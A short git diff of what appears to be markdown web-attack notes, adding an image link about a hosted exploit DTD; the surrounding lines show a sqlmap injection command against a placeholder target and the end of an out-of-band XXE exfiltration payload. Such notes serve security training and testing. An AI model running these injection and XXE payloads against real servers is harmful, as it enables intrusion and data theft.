@@ -296,6 +296,8 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 %eval;
 %exfil;
 ```  
+  
+![Exploit.DTD file hosted)(exploit.dtd.png)  
 
 >Modify the file upload XML body of the request before sending to the target server.  
 
